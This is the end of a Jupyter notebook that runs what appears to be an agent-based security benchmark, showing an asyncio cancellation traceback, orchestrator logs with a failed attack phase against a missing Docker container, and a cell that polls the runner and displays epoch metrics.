      "\u001b[36mFile \u001b[39m\u001b[32m/usr/lib/python3.13/asyncio/tasks.py:718\u001b[39m, in \u001b[36msleep\u001b[39m\u001b[34m(delay, result)\u001b[39m\n\u001b[32m    714\u001b[39m h = loop.call_later(delay,\n\u001b[32m    715\u001b[39m                     futures._set_result_unless_cancelled,\n\u001b[32m    716\u001b[39m                     future, result)\n\u001b[32m    717\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m718\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;01mawait\u001b[39;00m future\n\u001b[32m    719\u001b[39m \u001b[38;5;28;01mfinally\u001b[39;00m:\n\u001b[32m    720\u001b[39m     h.cancel()\n",
      "\u001b[36mFile \u001b[39m\u001b[32m/usr/lib/python3.13/asyncio/futures.py:286\u001b[39m, in \u001b[36mFuture.__await__\u001b[39m\u001b[34m(self)\u001b[39m\n\u001b[32m    284\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28mself\u001b[39m.done():\n\u001b[32m    285\u001b[39m     \u001b[38;5;28mself\u001b[39m._asyncio_future_blocking = \u001b[38;5;28;01mTrue\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m286\u001b[39m     \u001b[38;5;28;01myield\u001b[39;00m \u001b[38;5;28mself\u001b[39m  \u001b[38;5;66;03m# This tells Task to wait for completion.\u001b[39;00m\n\u001b[32m    287\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28mself\u001b[39m.done():\n\u001b[32m    288\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mRuntimeError\u001b[39;00m(\u001b[33m\"\u001b[39m\u001b[33mawait wasn\u001b[39m\u001b[33m'\u001b[39m\u001b[33mt used with future\u001b[39m\u001b[33m\"\u001b[39m)\n",
      "\u001b[31mCancelledError\u001b[39m: "
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 30s...\n",
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n",
      "ERROR:benchmark.Orchestrator:Error in epoch 1: 'NoneType' object has no attribute 'get_recent_iterations'\n",
      "INFO:benchmark.Orchestrator:Waiting 20s before next epoch...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 2 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Attack running for 60s...\n",
      "ERROR:benchmark.AttackerController:Error executing attack: 404 Client Error for http+docker://localhost/v1.51/containers/eb98eba19f2641cb7495493070169d174ac1893870db5e4f2a3abc9df03e7eaf/exec: Not Found (\"No such container: eb98eba19f2641cb7495493070169d174ac1893870db5e4f2a3abc9df03e7eaf\")\n"
     ]
    }
   ],
   "source": [
    "import asyncio\n",
    "from IPython.display import display, clear_output\n",
    "import pandas as pd\n",
    "\n",
    "async def run_with_monitoring():\n",
    "    runner = b.BenchmarkRunner({\"max_epochs\": 5})\n",
    "    runner.set_agent_executor(my_agent_executor)\n",
    "    \n",
    "    # Start benchmark in background\n",
    "    import threading\n",
    "    benchmark_thread = threading.Thread(target=runner.run)\n",
    "    benchmark_thread.start()\n",
    "    \n",
    "    # Monitor progress\n",
    "    while benchmark_thread.is_alive():\n",
    "        clear_output(wait=True)\n",
    "        status = runner.get_current_status()\n",
    "        \n",
    "        if status[\"status\"] == \"running\":\n",
    "            display(f\"Epoch: {status['current_epoch']}/{runner.config.max_epochs}\")\n",
    "            if status[\"latest_metrics\"]:\n",
    "                df = pd.DataFrame([status[\"latest_metrics\"]])\n",
    "                display(df[['epoch_number', 'lockdown_activated', 'attack_graph_coverage']])\n",
    "        \n",
    "        await asyncio.sleep(5)\n",
    "    \n",
    "    return runner.results\n",
    "\n",
    "# Run with monitoring\n",
    "results = await run_with_monitoring()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
